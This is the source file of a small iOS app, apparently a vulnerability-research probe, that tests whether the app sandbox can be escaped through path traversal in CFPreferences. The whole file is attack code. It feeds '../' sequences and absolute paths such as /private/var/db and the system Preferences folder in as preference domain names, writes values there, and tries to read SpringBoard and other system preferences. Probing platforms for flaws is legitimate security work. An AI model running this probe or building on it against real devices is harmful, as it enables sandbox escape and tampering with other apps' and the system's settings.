// sbprefs — CFPreferences path traversal probe.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dirent.h>
#import <unistd.h>

static FILE *gLog;
static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbprefs] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static void setDomain(NSString *domain, NSString *key, NSString *val) {
    CFStringRef d = (__bridge CFStringRef)domain;
    CFStringRef k = (__bridge CFStringRef)key;
    CFStringRef v = (__bridge CFStringRef)val;
    CFPreferencesSetValue(k, v, d, kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
    Boolean ok = CFPreferencesAppSynchronize(d);
    L(@"set domain=%@ sync=%d", domain, ok);
    CFPropertyListRef got = CFPreferencesCopyValue(k, d, kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
    L(@"get domain=%@ -> %@", domain, got ? (__bridge id)got : @"(null)");
    if (got) CFRelease(got);
}

static void runProbe(void) {
    @autoreleasepool {
        gLog = fopen([NSHomeDirectory() stringByAppendingPathComponent:@"Documents/sbprefs.log"].fileSystemRepresentation, "w");
        L(@"=== sbprefs start pid=%d home=%@", getpid(), NSHomeDirectory());
        NSString *g = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.8e0bc870a21520b9.1"].path;
        L(@"group=%@", g);
        NSString *uuid = g.lastPathComponent;
        NSArray *domains = @[
            @"com.apple.sbprefs.plain",
            @"../sbprefs_up1",
            @"../../../../sbprefs_up4",
            @"../../../../../sbprefs_up5",
            [NSString stringWithFormat:@"../../../../../Containers/Shared/AppGroup/%@/Documents/sbprefs_g5", uuid],
            [NSString stringWithFormat:@"../../Containers/Shared/AppGroup/%@/Documents/sbprefs_g2", uuid],
            [NSString stringWithFormat:@"/var/mobile/Containers/Shared/AppGroup/%@/Documents/sbprefs_abs", uuid],
            @"/var/mobile/Library/Preferences/sbprefs_sys",
            @"/var/mobile/Library/Preferences/com.apple.Preferences",
            @"/private/var/db/sbprefs_root",
        ];
        for (NSString *d in domains) setDomain(d, @"k", @"v");
        setDomain(@"/var/mobile/Library/Preferences/com.apple.Preferences", @"SBPrefsProbe", @"yes");
        {
            CFPropertyListRef v = CFPreferencesCopyValue(CFSTR("SBPrefsProbe"), CFSTR("com.apple.Preferences"), kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
            L(@"crossread com.apple.Preferences -> %@", v ? (__bridge id)v : @"(null)");
            if (v) CFRelease(v);
        }
        {
            CFStringRef d = CFSTR("/private/var/db/sbprefs_root");
            CFPreferencesSetValue(CFSTR("k2"), CFSTR("v2"), d, kCFPreferencesAnyUser, kCFPreferencesAnyHost);
            Boolean ok = CFPreferencesAppSynchronize(d);
            CFPropertyListRef v = CFPreferencesCopyValue(CFSTR("k2"), d, kCFPreferencesAnyUser, kCFPreferencesAnyHost);
            L(@"anyuser root write sync=%d read=%@", ok, v ? (__bridge id)v : @"(null)");
            if (v) CFRelease(v);
        }
        NSArray *paths = @[
            [g stringByAppendingPathComponent:@"Documents/sbprefs_g5.plist"],
            [g stringByAppendingPathComponent:@"Documents/sbprefs_g2.plist"],
            [g stringByAppendingPathComponent:@"Documents/sbprefs_abs.plist"],
        ];
        for (NSString *p in paths) {
            L(@"exists %@ -> %d", p, [[NSFileManager defaultManager] fileExistsAtPath:p]);
        }
        // Cross-domain reads of system preferences.
        for (NSString *d in @[@"com.apple.springboard", @"com.apple.Preferences", @"com.apple.mobilegestaltcache"]) {
            CFStringRef dd = (__bridge CFStringRef)d;
            CFPropertyListRef v = CFPreferencesCopyValue(CFSTR("SBLastKnownGoodConfiguration"), dd, kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
            L(@"xread %@ -> %@", d, v ? @"YES" : @"null");
            if (v) CFRelease(v);
        }
        L(@"=== sbprefs done ===");
        if (gLog) { fclose(gLog); gLog = NULL; }
        exit(0);
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=[UIColor systemBackgroundColor];
    UILabel *l=[[UILabel alloc] initWithFrame:vc.view.bounds]; l.text=@"sbprefs"; l.textAlignment=NSTextAlignmentCenter;
    [vc.view addSubview:l]; self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
